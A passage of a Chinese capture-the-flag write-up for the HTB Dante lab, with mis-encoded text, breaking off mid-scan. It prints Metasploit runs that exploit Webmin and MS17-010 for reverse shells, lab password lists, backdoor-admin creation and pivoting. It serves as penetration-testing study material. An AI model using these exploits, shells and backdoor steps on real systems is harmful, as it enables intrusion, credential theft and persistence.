		<span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span><span class="o">++</span> <span class="o">%</span> <span class="nv">$cols</span> <span class="o">==</span> <span class="nv">$cols</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/tr&gt;</span><span class="se">\n</span><span class="p">";</span> <span class="p">}</span>
		<span class="p">}</span>
	<span class="k">while</span><span class="p">(</span><span class="nv">$pos</span><span class="o">++</span> <span class="o">%</span> <span class="nv">$cols</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td width=</span><span class="si">$per</span><span class="se">\</span><span class="s2">%&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;hr id='mods_hr'&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="p">}</span>

<span class="c1"># Check for incorrect OS</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">&amp;foreign_check</span><span class="p">("</span><span class="s2">webmin</span><span class="p">"))</span> <span class="p">{</span>
	<span class="nv">&amp;foreign_require</span><span class="p">("</span><span class="s2">webmin</span><span class="p">",</span> <span class="p">"</span><span class="s2">webmin-lib.pl</span><span class="p">");</span>
	<span class="nv">&amp;</span><span class="nn">webmin::</span><span class="nv">show_webmin_notifications</span><span class="p">();</span>
	<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$miniserv</span><span class="p">{'</span><span class="s1">logout</span><span class="p">'}</span> <span class="o">&amp;&amp;</span>
    <span class="o">!</span><span class="nv">$ENV</span><span class="p">{'</span><span class="s1">SSL_USER</span><span class="p">'}</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$ENV</span><span class="p">{'</span><span class="s1">LOCAL_USER</span><span class="p">'}</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$ENV</span><span class="p">{'</span><span class="s1">ANONYMOUS_USER</span><span class="p">'}</span> <span class="o">&amp;&amp;</span>
    <span class="nv">$ENV</span><span class="p">{'</span><span class="s1">HTTP_USER_AGENT</span><span class="p">'}</span> <span class="o">!~</span> <span class="sr">/webmin/i</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;table id='altlogout' width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$</span><span class="nn">main::</span><span class="nv">session_id</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td align=right&gt;&lt;a href='session_login.cgi?logout=1'&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="si">$text</span><span class="s2">{'main_logout'}&lt;/a&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;td align=right&gt;&lt;a href=switch_user.cgi&gt;</span><span class="p">",</span>
		      <span class="p">"</span><span class="si">$text</span><span class="s2">{'main_switch'}&lt;/a&gt;&lt;/td&gt;</span><span class="se">\n</span><span class="p">";</span>
		<span class="p">}</span>
	<span class="k">print</span> <span class="p">"</span><span class="s2">&lt;/tr&gt;&lt;/table&gt;</span><span class="se">\n</span><span class="p">";</span>
	<span class="p">}</span>

<span class="k">print</span> <span class="nv">$text</span><span class="p">{'</span><span class="s1">main_footer</span><span class="p">'};</span>
<span class="nv">&amp;footer</span><span class="p">();</span>

</code></pre></div></div>
<h2 id="webmin-æœåŠ¡-rce">webmin æœåŠ¡ RCE</h2>
<p>10000 ç«¯å£éƒ¨ç½²äº†ä¸€ä¸ª webmin æœåŠ¡ï¼Œç»“åˆæ­¤å‰ä» monitor ä¸­è·å–çš„ç”¨æˆ·åå¯†ç ï¼š</p>
<ul>
  <li>admin/password6543</li>
  <li>admin/Password6543</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231226023313.png" alt="20231226023313"></p>

<!-- ![Alt text](../../../../../assets/image-8.png) -->

<p>ä½¿ç”¨ç¬¬äºŒä¸ªå¯†ç å¯ä»¥æˆåŠŸç™»é™†ï¼Œå¹¶ä¸” 1.900 å­˜åœ¨è¾ƒå¤šæ¼æ´ã€‚</p>

<p>msf ä¸­é›†æˆäº†ä¸€äº› expã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                           Disclosure Date  Rank       Check  Description</span>
   -  <span class="nt">----</span>                                           <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3  exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4  exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   6  auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   7  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor

</code></pre></div></div>

<p>ä½†æˆ‘åœ¨åˆ©ç”¨å¦‚ä¸‹çš„å‡ ä¸ª exp æ—¶éƒ½æ— æ³•æˆåŠŸ</p>
<ul>
  <li>exploit/linux/http/webmin_packageup_rce (webmin&lt;=1.900)</li>
  <li>exploit/linux/http/webmin_file_manager_rce (webmin v1.984)</li>
</ul>

<p>æœ€åæˆåŠŸæ˜¯åˆ©ç”¨äº†è¿™ä¸ª expï¼š</p>
<ul>
  <li>exploit/linux/http/webmin_packageup_rce (&lt;=1.910)</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 172.16.1.17
RHOSTS <span class="o">=&gt;</span> 172.16.1.17
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username admin
username <span class="o">=&gt;</span> admin
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password Password6543
password <span class="o">=&gt;</span> Password6543
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 5555
LPORT <span class="o">=&gt;</span> 5555
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.14.5
LHOST <span class="o">=&gt;</span> 10.10.14.5
msf6 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:5555 
<span class="o">[</span>+] Session cookie: e1dece8037d8d0ad4eb308ceb0166993
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to execute the payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 12 opened <span class="o">(</span>10.10.14.5:5555 -&gt; 10.10.110.3:40521<span class="o">)</span> at 2023-12-26 03:17:45 <span class="nt">-0500</span>


<span class="nb">whoami
</span>root


</code></pre></div></div>
<p>ä¸€å¼€å§‹è·å–åˆ°çš„æ˜¯ shï¼Œæ— æ³•åˆ‡ç›®å½•ä¹Ÿæ— æ³•è¯»å– /root/flag.txtï¼Œå¯èƒ½æ˜¯å¯¹ sh è¿›è¡Œäº†é™åˆ¶ï¼Œè¿›å…¥ bash åå¯ä»¥æ­£å¸¸è¯»å–æ–‡ä»¶ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$0</span>
bash
<span class="nb">cat</span> /root/flag
</code></pre></div></div>

<p>ç”¨æˆ·ç›®å½•ä¸‹æœ‰ä¸€ä¸ªç”¨æˆ· louï¼Œä½† Desktop ä¸­æ²¡æœ‰ flagã€‚</p>

<h1 id="windows-17216120-dante-dc01">Windows: 172.16.1.20 (DANTE-DC01)</h1>

<h2 id="ms17-010">MS17-010</h2>
<p>msf ä¸­å…³äº MS17-010 çš„ exp æ€»å…±æœ‰å››ä¸ªï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0  exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
1  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
2  auxiliary/admin/smb/ms17_010_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
3  auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection
</code></pre></div></div>

<ol>
  <li>exploit/windows/smb/ms17_010_eternalblue å­˜åœ¨ms17-010æ¼æ´å³å¯ä½¿ç”¨ï¼Œä¸å¤ªç¨³å®šï¼Œå®¹æ˜“è¢«æ€è½¯è¯†åˆ«ï¼Œæœ‰æ¦‚ç‡å¯¼è‡´ç›®æ ‡æœºè“å±</li>
  <li>exploit/windows/smb/ms17_010_psexec éœ€è¦å‘½åç®¡é“å¼€å¯ï¼Œé…åˆæ¨¡å—3ï¼Œæ¯” ms17_010_eternalblue ç¨³å®šï¼Œå¯ç»•è¿‡ä¸€äº›æ€è½¯ã€‚</li>
  <li>auxiliary/admin/smb/ms17_010_command è¯¥æ¨¡å—æ˜¯æ‰€æœ‰åˆ©ç”¨æ–¹æ³•ä¸­æœ€ä¸ºç¨³å®šçš„ï¼Œå¹¶ä¸”ä¸ä¼šè¢«æ€è½¯æ‹¦æˆªç­‰ã€‚å¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤æ·»åŠ ç”¨æˆ·ã€å¼€å¯3389ã€ä¸‹è½½Ratç­‰æ“ä½œã€‚</li>
  <li>auxiliary/scanner/smb/smb_ms17_010 ç”¨æ¥æ¢æµ‹ms17-010æ¼æ´æ˜¯å¦å­˜åœ¨</li>
</ol>

<p>æˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨ auxiliary/scanner/smb/smb_ms17_010 æ¢æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚æ³¨æ„åœ¨åˆ©ç”¨å‰å…ˆæ·»åŠ è·¯ç”±ï¼Œmulti/manage/autoroute æ¨¡å—å¯ä»¥è‡ªåŠ¨æ·»åŠ è·¯ç”±ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use multi/manage/autoroute
<span class="nb">set </span>session 1
exploit
</code></pre></div></div>
<p>æ¢æµ‹æ¼æ´</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/smb/smb_ms17_010
<span class="nb">set </span>RHOSTS 172.16.1.20
exploit 

<span class="o">[</span>+] 172.16.1.20:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 <span class="o">(</span>64-bit<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445       - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
</code></pre></div></div>
<p>ä½¿ç”¨ use exploit/windows/smb/ms17_010_psexec æ¨¡å—è¿›è¡Œåˆ©ç”¨ã€‚payload ä¹Ÿå¯ä»¥ä½¿ç”¨ set payload windows/meterpreter/reverse_tcpï¼Œå¯ä»¥è·å–ä¸€ä¸ª meterpreterã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/smb/ms17_010_psexec
<span class="nb">set </span>rhost 172.16.1.20
<span class="nb">set </span>lhost 10.10.14.5
<span class="c"># set payload windows/meterpreter/reverse_tcp</span>
<span class="nb">set </span>payload generic/shell_reverse_tcp
run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445 - Target OS: Windows Server 2012 R2 Standard 9600
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445 - Built a write-what-where primitive...
<span class="o">[</span>+] 172.16.1.20:445 - Overwrite complete... SYSTEM session obtained!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445 - Selecting PowerShell target
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 172.16.1.20:445 - Executing the payload...
<span class="o">[</span>+] 172.16.1.20:445 - Service start timed out, OK <span class="k">if </span>running a <span class="nb">command </span>or non-service executable...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 2 opened <span class="o">(</span>10.10.14.5:4444 -&gt; 10.10.110.3:41827<span class="o">)</span> at 2023-12-25 03:15:33 <span class="nt">-0500</span>


Shell Banner:
Microsoft Windows <span class="o">[</span>Version 6.3.9600]
<span class="nt">-----</span>
          

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>
<p>æˆåŠŸè·å–åˆ° SYSTEM shellã€‚</p>

<p>æŸ¥çœ‹ Users ç›®å½•ä¸‹çš„ç”¨æˆ·ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>12/25/2023  03:08 AM    &lt;DIR&gt;          katwamba
01/08/2021  12:26 PM    &lt;DIR&gt;          MediaAdmin<span class="err">$</span>
08/22/2013  03:39 PM    &lt;DIR&gt;          Public
06/10/2020  11:23 AM    &lt;DIR&gt;          <span class="nb">test
</span>07/19/2022  04:33 PM    &lt;DIR&gt;          xadmin
</code></pre></div></div>
<ul>
  <li>katwamba</li>
  <li>test</li>
  <li>xadmin</li>
</ul>

<p>åœ¨ <code class="language-plaintext highlighter-rouge">katwamba\Desktop</code> ç›®å½•ä¸‹æ‰¾åˆ° flag.txtã€‚è¯¥ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª employee_backup.xlsx æ–‡ä»¶ï¼Œä¸‹è½½å›æ¥ã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> download <span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\k</span><span class="s2">atwamba</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\e</span><span class="s2">mployee_backup.xlsx"</span> /project/HTB/ProLab/Dante
</code></pre></div></div>
<p>æ–‡ä»¶ä¸­åŒ…å«äº†å¾ˆå¤šç”¨æˆ·åå¯†ç ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith	Princess1
smoggat	Summer2019
tmodle	P45678!
ccraven	Password1
kploty	Teacher65
jbercov	4567Holiday1
whaguey	acb123
dcamtan	WorldOfWarcraft67
tspadly	RopeBlackfieldForwardslash
ematlis	JuneJuly1TY
fglacdon	FinalFantasy7
tmentrso	65RedBalloons
dharding	WestminsterOrange5
smillar	MarksAndSparks91
bjohnston	Bullingdon1
iahmed	Sheffield23
plongbottom	PowerfixSaturdayClub777
jcarrot	Tanenbaum0001
lgesley	SuperStrongCantForget123456789
</code></pre></div></div>

<h2 id="ç”¨æˆ·-comment-ä¿¡æ¯æ³„éœ²">ç”¨æˆ· Comment ä¿¡æ¯æ³„éœ²</h2>
<p>net users æŸ¥çœ‹ç”¨æˆ·æ—¶å‘ç°å­˜åœ¨ä¸€ä¸ª mrb3n ç”¨æˆ·ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹è¯¥ç”¨æˆ·çš„ä¿¡æ¯æ—¶ï¼Œå¯ä»¥åœ¨ Comment ä¸­å‘ç°å¯†ç å’Œ flagã€‚</p>
<ul>
  <li>mrb3n/S3kur1ty2020!</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;net user mrb3n
net user mrb3n
User name                    mrb3n
Full Name                    mrb3n
Comment                      mrb3n was here. I used keep my password S3kur1ty2020! here but have since stopped.  DANTE<span class="o">{</span>1_jusT_c@nt_st0p_d0ing_th1s<span class="o">}</span>
User<span class="s1">'s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/31/2020 3:43:25 PM
Password expires             1/27/2021 3:43:25 PM
Password changeable          7/31/2020 3:43:25 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
</span></code></pre></div></div>

<h2 id="åŸŸå†…ä¿¡æ¯æ”¶é›†æœ‰å‡­è¯">åŸŸå†…ä¿¡æ¯æ”¶é›†ï¼ˆæœ‰å‡­è¯ï¼‰</h2>
<p>æœ‰äº†åŸŸç”¨æˆ· mrb3n/S3kur1ty2020! åï¼Œå¯ä»¥ä½¿ç”¨ bloodhound æ”¶é›†åŸŸå†…ä¿¡æ¯ã€‚</p>

<p>bloodhound-python ç›¸æ¯” SharpHound çš„ä¼˜åŠ¿åœ¨äºä¸éœ€è¦åœ¨åŸŸå†…æœºå™¨ä¸­è½åœ°ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUDP è¯·æ±‚æ— æ³•ç»è¿‡ socks ä»£ç†ï¼Œä½† â€“dns-tcp å‚æ•°å¯ä»¥å°† dns è¯·æ±‚ä»¥ TCP çš„æ–¹å¼å‘é€ï¼Œè¿™æ ·å°±å¯ä»¥é¿å… bloodhound-python æ— æ³•è§£æåˆ°åŸŸåã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> bloodhound-python <span class="nt">--zip</span> <span class="nt">-c</span> All <span class="nt">-d</span> DANTE.local <span class="nt">-u</span> mrb3n <span class="nt">-p</span> <span class="s1">'S3kur1ty2020!'</span> <span class="nt">-dc</span> DANTE-DC01.DANTE.local <span class="nt">-ns</span> 172.16.1.20 <span class="nt">--dns-tcp</span>
</code></pre></div></div>

<p>ä½†ç›®æ ‡è¿”å›æ— æ³•è®¤è¯æˆåŠŸï¼Œéš¾é“æ˜¯å¯†ç ä¸å¯¹çš„ç¼˜æ•…ï¼Ÿ</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>INFO: Found AD domain: dante.local
INFO: Getting TGT <span class="k">for </span>user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="o">[</span>Errno Connection error <span class="o">(</span>dante.local:88<span class="o">)]</span> <span class="o">[</span>Errno 111] Connection refused
INFO: Connecting to LDAP server: DANTE-DC01.DANTE.local
ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0905FB, comment: AcceptSecurityContext error, data 52e, v2580
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/home/kali/.local/bin//bloodhound-python"</span>, line 8, <span class="k">in</span> &lt;module&gt;
    sys.exit<span class="o">(</span>main<span class="o">())</span>
             ^^^^^^
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py"</span>, line 338, <span class="k">in </span>main
    bloodhound.run<span class="o">(</span><span class="nv">collect</span><span class="o">=</span>collect,
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/__init__.py"</span>, line 79, <span class="k">in </span>run
    self.pdc.prefetch_info<span class="o">(</span><span class="s1">'objectprops'</span> <span class="k">in </span>collect, <span class="s1">'acl'</span> <span class="k">in </span>collect, <span class="nv">cache_computers</span><span class="o">=</span>do_computer_enum<span class="o">)</span>
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py"</span>, line 523, <span class="k">in </span>prefetch_info
    self.get_objecttype<span class="o">()</span>
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py"</span>, line 240, <span class="k">in </span>get_objecttype
    self.ldap_connect<span class="o">()</span>
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/domain.py"</span>, line 69, <span class="k">in </span>ldap_connect
    ldap <span class="o">=</span> self.ad.auth.getLDAPConnection<span class="o">(</span><span class="nb">hostname</span><span class="o">=</span>self.hostname, <span class="nv">ip</span><span class="o">=</span>ip,
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File <span class="s2">"/home/kali/.local/lib/python3.11/site-packages/bloodhound/ad/authentication.py"</span>, line 119, <span class="k">in </span>getLDAPConnection
    raise CollectionException<span class="o">(</span><span class="s1">'Could not authenticate to LDAP. Check your credentials and LDAP server requirements.'</span><span class="o">)</span>
bloodhound.ad.utils.CollectionException: Could not authenticate to LDAP. Check your credentials and LDAP server requirements.
</code></pre></div></div>

<h2 id="æ·»åŠ åé—¨ç”¨æˆ·">æ·»åŠ åé—¨ç”¨æˆ·</h2>
<p>ä½¿ç”¨ meterpreter æ·»åŠ åé—¨ç”¨æˆ·ï¼Œæ³¨æ„å¯†ç è¦ç¬¦åˆå¯†ç ç­–ç•¥ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> run post/windows/manage/enable_rdp <span class="nv">username</span><span class="o">=</span><span class="s2">"dummykitty"</span> <span class="nv">password</span><span class="o">=</span><span class="s2">"!QAZ2wsx#EDC"</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enabling Remote Desktop
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     RDP is already enabled
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting Terminal Services service startup mode
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Terminal Services service is already <span class="nb">set </span>to auto
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Opening port <span class="k">in </span><span class="nb">local </span>firewall <span class="k">if </span>necessary
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting user account <span class="k">for </span>logon
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Adding User: dummykitty with Password: <span class="o">!</span>QAZ2wsx#EDC
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Adding User: dummykitty to <span class="nb">local </span>group <span class="s1">'Remote Desktop Users'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Hiding user from Windows Login screen
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Adding User: dummykitty to <span class="nb">local </span>group <span class="s1">'Administrators'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> You can now login with the created user
</code></pre></div></div>
<p>æˆ–è€…æ‰‹åŠ¨åœ¨ shell ä¸­æ‰§è¡Œã€‚</p>
<pre><code class="language-bashã€€ã€€ã€€ã€€">net user dummykitty !QAZ2wsx#EDC /add
net localgroup administrators dummykitty /add   
</code></pre>
<p>å¦‚æœç›®æ ‡æœºå™¨æ²¡æœ‰å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼Œä¿®æ”¹æ³¨å†Œè¡¨ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\T</span>erminal<span class="s2">" "</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
</code></pre></div></div>

<p>æ·»åŠ å®Œåä¸çŸ¥é“ä¸ºä»€ä¹ˆéƒ½æ— æ³•æ­£å¸¸ç™»é™†ã€‚</p>

<h2 id="ä¸»æœºå­˜æ´»æ€§æ‰«æ">ä¸»æœºå­˜æ´»æ€§æ‰«æ</h2>
<p>å¸¸è§„çš„ä¸€äº›ç½‘ç»œå‘ç°å‘½ä»¤å¦‚ä¸‹ï¼Œä½†éƒ½æ²¡æœ‰å‘ç°å…¶ä»–ç½‘æ®µã€‚</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ipconfig</span><span class="w"> </span><span class="nx">/all</span><span class="w"> </span><span class="c">#Info about interfaces</span><span class="w">
</span><span class="n">route</span><span class="w"> </span><span class="nx">print</span><span class="w"> </span><span class="c">#Print available routes</span><span class="w">
</span><span class="n">arp</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="c">#Know hosts</span><span class="w">
</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="c">#Opened ports?</span><span class="w">
</span><span class="kr">type</span><span class="w"> </span><span class="n">C:\WINDOWS\System32\drivers\etc\hosts</span><span class="w">
</span><span class="nx">ipconfig</span><span class="w"> </span><span class="nx">/displaydns</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Record"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"Name Host"</span><span class="w">
</span></code></pre></div></div>

<p>åœ¨ DC01 ä¸­æ‰«æ 172.16.2.0/24 ç½‘æ®µï¼Œå¯ä»¥å‘ç°å­˜æ´»ä¸»æœº 172.16.2.5</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\system32</span><span class="err">&gt;</span><span class="p">(</span><span class="kr">for</span><span class="w"> </span><span class="n">/L</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="n">ping</span><span class="w"> </span><span class="nx">/n</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">/w</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">172.16.2.</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="s2">"Reply"</span><span class="w">
</span><span class="p">(</span><span class="kr">for</span><span class="w"> </span><span class="n">/L</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">254</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="n">ping</span><span class="w"> </span><span class="nx">/n</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">/w</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">172.16.2.</span><span class="o">%</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="s2">"Reply"</span><span class="w">
</span><span class="n">Reply</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">172.16.2.5:</span><span class="w"> </span><span class="nx">bytes</span><span class="o">=</span><span class="mi">32</span><span class="w"> </span><span class="n">time</span><span class="err">&lt;</span><span class="nx">1ms</span><span class="w"> </span><span class="nx">TTL</span><span class="o">=</span><span class="mi">127</span><span class="w">
</span></code></pre></div></div>

<h1 id="windows-1721625-dante-dc02">Windows: 172.16.2.5 (DANTE-DC02)</h1>
<h2 id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</h2>
<p>172.16.2.5 ä¸»æœºåªæœ‰ 172.16.1.20 å¯ä»¥è®¿é—®ã€‚msf å¯ä»¥å€ŸåŠ© 172.16.1.20 ä¸­çš„ session è‡ªåŠ¨æ·»åŠ è·¯ç”±ï¼Œç„¶åå¯¹ 172.16.2.5 è¿›è¡Œç«¯å£æ‰«æã€‚</p>

<p>åœ¨ 172.16.1.20 çš„ session ä¸­æ‰§è¡Œ autoroute</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> run autoroute <span class="nt">-s</span> 172.16.2.0/24
</code></pre></div></div>
<p>ç„¶åä½¿ç”¨ auxiliary/scanner/portscan/tcp è¿›è¡Œç«¯å£æ‰«æã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> <span class="o">&gt;</span> use auxiliary/scanner/portscan/tcp
msf6 auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 172.16.2.5
RHOSTS <span class="o">=&gt;</span> 172.16.2.5
